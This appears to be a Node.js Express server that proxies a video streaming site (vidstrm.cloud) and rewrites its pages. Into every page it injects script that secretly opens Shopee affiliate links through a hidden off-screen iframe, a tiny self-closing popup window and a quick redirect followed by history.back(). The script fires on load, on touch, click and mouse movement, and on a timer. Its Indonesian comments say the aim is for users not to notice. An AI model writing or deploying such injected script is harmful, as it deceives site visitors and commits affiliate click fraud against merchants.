const express = require('express');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

const BASE_URL = 'https://vidstrm.cloud';

const SHOPEE_LINKS = [
  'https://s.shopee.co.id/8AQUp3ZesV',
  'https://s.shopee.co.id/9pYio8K2cw',
  'https://s.shopee.co.id/8pgBcJjIzl',
  'https://s.shopee.co.id/60M0F7txlS',
  'https://s.shopee.co.id/7VAo1N0hIp',
  'https://s.shopee.co.id/9KcSCm0Xb7',
  'https://s.shopee.co.id/3LLF3lT65E',
  'https://s.shopee.co.id/6VIGpbCEoc'
];

app.use(async (req, res) => {
  try {
    const targetUrl = BASE_URL + req.url;
    const currentPath = req.url;
    
    const response = await fetch(targetUrl);
    let html = await response.text();
    
    // HAPUS SEMUA TIMER/COUNTDOWN
    html = html.replace(/setTimeout\([^)]*\)/g, '// removed');
    html = html.replace(/setInterval\([^)]*\)/g, '// removed');
    html = html.replace(/\d+\s*detik/gi, '');
    
    // SCRIPT: Background redirect tanpa user sadar
    const script = `
    <script>
      const links = ${JSON.stringify(SHOPEE_LINKS)};
      const targetUrl = '${BASE_URL}${currentPath}';
      let executed = false;
      
      function backgroundRedirect() {
        if (executed) return;
        executed = true;
        
        const shopeeLink = links[Math.floor(Math.random() * links.length)];
        
        // METHOD 1: Hidden iframe untuk buka Shopee di background
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.style.visibility = 'hidden';
        iframe.style.position = 'absolute';
        iframe.style.top = '-9999px';
        iframe.style.left = '-9999px';
        iframe.src = shopeeLink;
        document.body.appendChild(iframe);
        
        // METHOD 2: Juga coba window.open di background
        setTimeout(() => {
          const hiddenWindow = window.open(shopeeLink, '_blank', 'noopener,noreferrer,width=1,height=1,left=-1000,top=-1000');
          if (hiddenWindow) {
            setTimeout(() => hiddenWindow.close(), 1000);
          }
        }, 100);
        
        // METHOD 3: Navigasi langsung tapi cepat banget
        setTimeout(() => {
          window.location.href = shopeeLink;
          setTimeout(() => {
            window.history.back(); // Coba kembali
          }, 10);
        }, 200);
        
        console.log('Shopee opened in background');
      }
      
      // Execute immediately on page load
      document.addEventListener('DOMContentLoaded', function() {
        setTimeout(backgroundRedirect, 1000);
      });
      
      // Juga execute pada user interaction (tap/click)
      document.addEventListener('click', backgroundRedirect);
      document.addEventListener('touchstart', backgroundRedirect);
      document.addEventListener('mousemove', backgroundRedirect, { once: true });
      
      // Auto setelah 3 detik
      setTimeout(backgroundRedirect, 3000);
    </script>
    
    <style>
      /* Sembunyikan banner redirect */
      .redirect-banner {
        position: fixed;
        bottom: 10px;
        right: 10px;
        background: rgba(238, 77, 45, 0.9);
        color: white;
        padding: 8px 12px;
        border-radius: 15px;
        font-family: Arial;
        font-size: 11px;
        z-index: 999999;
        opacity: 0.7;
        transition: opacity 0.3s;
        max-width: 200px;
      }
      .redirect-banner:hover {
        opacity: 1;
      }
    </style>
    `;
    
    // BANNER KECIL DI POJOK (optional)
    const banner = `
    <div class="redirect-banner" onclick="this.style.display='none'">
      <div style="font-weight:bold;">⚡ Auto-redirect aktif</div>
      <div style="font-size:9px; opacity:0.8;">Shopee akan terbuka di background</div>
    </div>
    `;
    
    // Inject
    html = html.replace('<body', banner + '<body');
    html = html.replace('</body>', script + '</body>');
    
    // Fix internal links
    html = html.replace(/href="https:\/\/vidstrm\.cloud\//g, 'href="/');
    
    res.set('Content-Type', 'text/html').send(html);
    
  } catch (error) {
    console.error('Error:', error);
    res.redirect('https://s.shopee.co.id/8AQUp3ZesV');
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server: http://localhost:${PORT}`);
  console.log(`🎯 Strategy: Background redirect (user tidak sadar)`);
  console.log(`🛍️ Shopee opens in background, user tetap di vidstrm`);
});
